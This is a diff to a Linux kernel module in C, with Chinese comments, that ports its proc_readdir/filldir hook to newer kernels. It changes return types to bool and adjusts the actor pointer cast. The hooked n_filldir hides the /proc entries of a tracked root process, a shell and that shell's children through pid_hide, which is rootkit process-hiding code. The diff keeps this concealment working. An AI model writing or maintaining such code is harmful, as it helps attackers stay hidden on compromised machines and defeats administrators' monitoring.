@@ -28,7 +28,8 @@ extern hook_t _tbl[];
 
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(3,10,0)
-static int (*ptr_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned);
+// 新内核中filldir_t返回bool类型
+static bool (*ptr_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned);
 #elif LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 8)
 static int (*ptr_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
 #endif
@@ -82,7 +83,8 @@ static inline char is_pid(long x)
 static long _root = 0;
 static long _sh = 0;
 #if LINUX_VERSION_CODE > KERNEL_VERSION(3,10,0)
-static int n_filldir( struct dir_context *nrf_ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type )
+// 新内核中filldir_t返回bool类型
+static bool n_filldir( struct dir_context *nrf_ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type )
 #elif LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 8)
 static int n_filldir(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
 #endif
@@ -118,7 +120,11 @@ static int n_filldir(void *__buf, const char *name, int namelen, loff_t offset, 
 					_sh = _task->pid;
 				}
 
+#if LINUX_VERSION_CODE > KERNEL_VERSION(3,10,0)
+				return true;
+#else
 				return 0;
+#endif
 			}
 
 			if (tsk_parent != NULL && tsk_parent->pid != 1 && tsk_parent->pid == _sh && _sh != 0)
@@ -126,7 +132,11 @@ static int n_filldir(void *__buf, const char *name, int namelen, loff_t offset, 
 				debug(" 2. pid %ld  ppid %ld\n", (long)_task->pid, (long)tsk_parent->pid);
 				pid_hide(pid);
 
+#if LINUX_VERSION_CODE > KERNEL_VERSION(3,10,0)
+				return true;
+#else
 				return 0;
+#endif
 			}
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 8)
@@ -140,12 +150,20 @@ static int n_filldir(void *__buf, const char *name, int namelen, loff_t offset, 
 				pid_hide(pid);
 
 				debug(" 0. %ld  name:%s \n", pid, _task->comm);
+#if LINUX_VERSION_CODE > KERNEL_VERSION(3,10,0)
+				return true;
+#else
 				return 0;
+#endif
 			}
 			
 			if (is_pid(pid))
 			{
+#if LINUX_VERSION_CODE > KERNEL_VERSION(3,10,0)
+				return true;
+#else
 				return 0;
+#endif
 			}
 
 		}
@@ -165,9 +183,11 @@ int __proc_readdir(struct file *file, struct dir_context *ctx)
 	hook_t *hk = NULL;
 	int proc_readdir(struct file * file, struct dir_context * ctx);
 
-	ptr_filldir = ctx->actor;
+	// 修复filldir_t类型兼容性
+	ptr_filldir = (filldir_t)ctx->actor;
 
-	*((filldir_t *)&ctx->actor) = &n_filldir;
+	// 使用正确的类型转换
+	ctx->actor = (filldir_t)&n_filldir;
 
 	hk = &_tbl[1];
 
